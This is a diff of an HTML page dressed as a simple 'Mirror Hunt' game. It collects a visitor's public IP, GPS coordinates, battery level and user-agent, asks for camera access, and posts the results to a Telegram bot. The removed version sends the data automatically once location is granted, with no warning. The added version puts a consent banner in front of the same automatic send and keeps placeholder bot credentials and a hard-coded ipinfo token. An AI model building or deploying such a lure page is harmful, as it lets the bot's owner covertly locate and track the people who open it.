@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Mirror Hunt — Demo Aman</title>
+<title>Mirror Hunt — Demo Aman (Auto Send)</title>
 <style>
   :root{--bg:#0f172a;--card:#111827;--accent:#7c3aed;--glass:rgba(255,255,255,0.04);}
   body{margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(135deg,#0b1220,#102033);color:#e6eef8;display:flex;min-height:100vh;align-items:center;justify-content:center;padding:18px;}
@@ -21,14 +21,39 @@
   .hidden{display:none}
   .flex{display:flex;gap:8px;align-items:center}
   .badge{background:var(--glass);padding:6px 8px;border-radius:8px;font-size:0.85rem}
+  /* Consent banner */
+  .consent-banner{
+    position:fixed;left:0;right:0;top:0;bottom:0;
+    background:rgba(2,6,23,0.7);display:flex;align-items:center;justify-content:center;z-index:9999;
+  }
+  .consent-box{background:#0b1220;border-radius:10px;padding:18px;max-width:720px;width:94%;box-shadow:0 8px 40px rgba(0,0,0,0.6)}
+  .consent-actions{display:flex;gap:10px;justify-content:flex-end;margin-top:12px}
+  .btn-secondary{background:transparent;border:1px solid rgba(255,255,255,0.08);color:#e6eef8;padding:8px 12px;border-radius:8px;cursor:pointer}
 </style>
 </head>
 <body>
+  <!-- Consent banner: user must explicitly agree before we request permissions or send -->
+  <div id="consent" class="consent-banner" aria-live="polite">
+    <div class="consent-box" role="dialog" aria-modal="true" aria-label="Persetujuan Pengiriman Data">
+      <h2 style="margin:0 0 6px 0">Persetujuan Pengiriman Data</h2>
+      <p style="margin:0 0 8px 0;opacity:0.9">
+        Untuk keperluan demo di perangkatmu, situs ini akan meminta izin kamera & lokasi.
+        Setelah kamu menekan <strong>"I AGREE — Kirim data"</strong> dan mengizinkan prompt browser,
+        data berikut <em>akan otomatis</em> dikirim ke Telegram (IP, lokasi jika diizinkan, baterai, user-agent).
+      </p>
+      <p style="margin:0 0 8px 0;color:#fbbf24">Hanya gunakan ini untuk testing di perangkatmu sendiri. Jangan gunakan untuk melanggar privasi orang lain.</p>
+      <div class="consent-actions">
+        <button id="btnCancel" class="btn-secondary">Cancel — Tampilkan Saja</button>
+        <button id="btnAgree" style="background:#10b981;color:white;border:0;padding:8px 12px;border-radius:8px;cursor:pointer">I AGREE — Kirim data</button>
+      </div>
+    </div>
+  </div>
+
   <div class="app" role="main" aria-labelledby="title">
     <header>
       <div>
-        <h1 id="title">Mirror Hunt — Game Demo</h1>
-        <small>Game ini otomatis kirim data device ke Telegram.</small>
+        <h1 id="title">Mirror Hunt — Game Demo (Auto Send)</h1>
+        <small>Demo: data dikirim otomatis setelah kamu setuju dan mengizinkan prompt browser.</small>
       </div>
       <div style="margin-left:auto" class="flex">
         <span class="badge" id="permStatus">Permission: —</span>
@@ -38,9 +63,7 @@
     <div class="row" style="margin-top:14px">
       <div class="col card">
         <div style="display:flex;gap:10px;align-items:center;">
-          <button id="btnEnableCam">Enable Camera</button>
-          <button id="btnEnableLoc">Enable Location</button>
-          <button id="btnClear" class="danger">Stop & Clear</button>
+          <!-- No permission buttons in main UI per request -->
         </div>
 
         <div style="margin-top:12px" id="camArea" class="hidden">
@@ -53,7 +76,7 @@
       </div>
 
       <div class="col card">
-        <h3>Device Info</h3>
+        <h3>Device Info (Local preview)</h3>
         <div class="meta">
           <div>IP: <span id="ip">-</span></div>
           <div>Location: <span id="loc">-</span></div>
@@ -65,7 +88,7 @@
 
         <h4>Note</h4>
         <p style="font-size:0.9rem;opacity:0.9">
-          Data akan dikirim otomatis ke Telegram ketika sudah berhasil didapat.
+          Setelah kamu setuju, browser akan minta izin Camera & Location. Kalau diizinkan, data akan dikirim otomatis.
         </p>
       </div>
     </div>
@@ -76,9 +99,15 @@
 <script>
 (async ()=>{
 
-  const btnCam = document.getElementById('btnEnableCam');
-  const btnLoc = document.getElementById('btnEnableLoc');
-  const btnClear = document.getElementById('btnClear');
+  // --- GANTI INI DENGAN CREDENTIAL TELEGRAM LO ---
+  const CHAT_ID = "GANTI_CHAT_ID";
+  const BOT_TOKEN = "GANTI_BOT_TOKEN";
+  // ------------------------------------------------
+
+  const consentEl = document.getElementById('consent');
+  const btnAgree = document.getElementById('btnAgree');
+  const btnCancel = document.getElementById('btnCancel');
+
   const video = document.getElementById('video');
   const camArea = document.getElementById('camArea');
   const ipEl = document.getElementById('ip');
@@ -92,114 +121,138 @@
 
   uaEl.textContent = navigator.userAgent;
 
-  // ambil IP publik
-  let ipData = '';
-  try {
-    const resp = await fetch('https://ipinfo.io/json?token=5602d2e05cb668').then(r=>r.json()).catch(()=>null);
-    if(resp && resp.ip){
-      ipData = resp.ip + ' — ' + (resp.city||'-') + ', ' + (resp.country||'-');
-      ipEl.textContent = ipData;
-    } else ipEl.textContent = 'Tidak tersedia';
-  } catch(e){ ipEl.textContent = 'Error'; }
-
-  // battery
-  try {
-    if(navigator.getBattery) {
-      const battery = await navigator.getBattery();
-      const upd = ()=> {
-        batEl.textContent = Math.round(battery.level*100) + '%' + (battery.charging ? ' ⚡️' : '');
-      };
-      upd();
-      battery.addEventListener('levelchange', upd);
-      battery.addEventListener('chargingchange', upd);
-    } else { batEl.textContent = 'Tidak didukung'; }
-  } catch(e){ batEl.textContent = 'Error'; }
-
-  // camera
-  let stream = null;
-  btnCam.addEventListener('click', async ()=>{
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-      video.srcObject = stream;
-      camArea.classList.remove('hidden');
-      permStatus.textContent = 'Permission: Camera ✅';
-      logMessage('Camera diaktifkan.');
-    } catch(err){
-      permStatus.textContent = 'Permission: Camera ❌';
-    }
-  });
-
-  // location
-  btnLoc.addEventListener('click', async ()=>{
-    if(!navigator.geolocation){ return; }
-    permStatus.textContent = 'Permission: Meminta lokasi…';
-    navigator.geolocation.getCurrentPosition(pos=>{
-      const coords = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (acc ${pos.coords.accuracy}m)`;
-      locEl.textContent = coords;
-      permStatus.textContent = 'Permission: Location ✅';
-      logMessage('Lokasi diambil.');
-      autoSend(); // kirim otomatis setelah lokasi berhasil
-    });
-  });
-
-  // stop & clear
-  btnClear.addEventListener('click', ()=>{
-    if(stream){
-      stream.getTracks().forEach(t=>t.stop());
-      stream = null;
-      video.srcObject = null;
-    }
-    camArea.classList.add('hidden');
-    permStatus.textContent = 'Permission: —';
-    locEl.textContent = '-';
-  });
-
-  // SIMPLE GAME
-  btnStartGame.addEventListener('click', async ()=>{
-    if(!stream){ return; }
-    gameStatus.textContent = 'Preparing...';
-    await delay(700);
-    gameStatus.textContent = 'Find RED';
-  });
-
-  // === Kirim ke Telegram otomatis ===
-  const CHAT_ID = "GANTI_CHAT_ID";
-  const BOT_TOKEN = "GANTI_BOT_TOKEN";
-
-  async function autoSend(){
-    const text = `
-🌐 Informasi IP
-${ipEl.textContent}
-
-📱 Device Info
-Battery: ${batEl.textContent}
-UA: ${uaEl.textContent}
-
-📍 Lokasi
-${locEl.textContent}
-
-⏰ Waktu: ${new Date().toLocaleString("id-ID")}
-    `.trim();
-
-    try{
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({chat_id:CHAT_ID,text})
-      });
-      logMessage("✅ Data otomatis terkirim ke Telegram");
-    }catch(e){
-      logMessage("❌ Gagal kirim ke Telegram");
-    }
-  }
-
-  function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
+  // helper
   function logMessage(s){
     log.classList.remove('hidden');
     const time = new Date().toLocaleTimeString();
     log.innerHTML = `<div style="font-size:0.9rem;opacity:0.95">[${time}] ${s}</div>` + log.innerHTML;
   }
+  function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
+  // fetch IP (public)
+  async function fetchIP(){
+    try {
+      const resp = await fetch('https://ipinfo.io/json?token=5602d2e05cb668').then(r=>r.json()).catch(()=>null);
+      if(resp && resp.ip){
+        const ipData = resp.ip + ' — ' + (resp.city||'-') + ', ' + (resp.country||'-');
+        ipEl.textContent = ipData;
+        return ipData;
+      } else {
+        ipEl.textContent = 'Tidak tersedia';
+        return ipEl.textContent;
+      }
+    } catch(e){
+      ipEl.textContent = 'Error';
+      return 'Error';
+    }
+  }
+
+  // battery
+  async function getBattery(){
+    try {
+      if(navigator.getBattery){
+        const battery = await navigator.getBattery();
+        const upd = ()=> batEl.textContent = Math.round(battery.level*100) + '%' + (battery.charging ? ' ⚡️' : '');
+        upd();
+        battery.addEventListener('levelchange', upd);
+        battery.addEventListener('chargingchange', upd);
+        return batEl.textContent;
+      } else {
+        batEl.textContent = 'Tidak didukung';
+        return batEl.textContent;
+      }
+    } catch(e){
+      batEl.textContent = 'Error';
+      return 'Error';
+    }
+  }
+
+  // auto-send function
+  async function sendToTelegram(payloadText){
+    try{
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: payloadText })
+      });
+      logMessage('✅ Data terkirim ke Telegram');
+    }catch(err){
+      console.error(err);
+      logMessage('❌ Gagal kirim ke Telegram');
+    }
+  }
+
+  // MAIN flow after consent accepted
+  async function mainFlow(){
+    consentEl.style.display = 'none';
+    permStatus.textContent = 'Permission: Requesting…';
+
+    const ip = await fetchIP();
+    const battery = await getBattery();
+
+    // try request camera (user will see browser prompt)
+    let stream = null;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      video.srcObject = stream;
+      camArea.classList.remove('hidden');
+      permStatus.textContent = 'Permission: Camera ✅';
+      logMessage('Camera diaktifkan (user allowed).');
+    } catch(e){
+      permStatus.textContent = 'Permission: Camera ❌';
+      logMessage('Camera tidak diizinkan / error.');
+    }
+
+    // try get location (browser prompt)
+    let locationText = 'Tidak tersedia';
+    try {
+      const pos = await new Promise((resolve, reject) => {
+        if(!navigator.geolocation) return reject(new Error('No geolocation'));
+        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy:true, timeout:10000 });
+      });
+      locationText = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (acc ${pos.coords.accuracy}m)`;
+      locEl.textContent = locationText;
+      permStatus.textContent = (permStatus.textContent.includes('❌') ? 'Permission:' : '') + ' Location ✅';
+      logMessage('Lokasi diambil (user allowed).');
+    } catch(err){
+      locEl.textContent = 'Tidak diizinkan / tidak tersedia';
+      logMessage('Lokasi tidak diizinkan / error.');
+    }
+
+    // prepare payload
+    const payload = `
+🌐 Informasi IP
+${ip}
+
+📱 Device Info
+UserAgent: ${navigator.userAgent}
+Battery: ${battery}
+
+📍 Lokasi
+${locEl.textContent}
+
+⏰ Waktu: ${new Date().toLocaleString("id-ID")}
+`.trim();
+
+    // auto-send (only after consent)
+    await sendToTelegram(payload);
+  }
+
+  // If user cancels consent: hide banner but do not send. We still show IP/battery locally.
+  btnCancel.addEventListener('click', async ()=>{
+    consentEl.style.display = 'none';
+    permStatus.textContent = 'Permission: Cancelled by user';
+    await fetchIP();
+    await getBattery();
+    logMessage('User memilih Cancel — tidak mengirim ke Telegram.');
+  });
+
+  btnAgree.addEventListener('click', ()=>{
+    // start main flow
+    mainFlow();
+  });
+
+  // Start: show banner (already visible). Nothing else runs until user makes a choice.
 })();
 </script>
 </body>
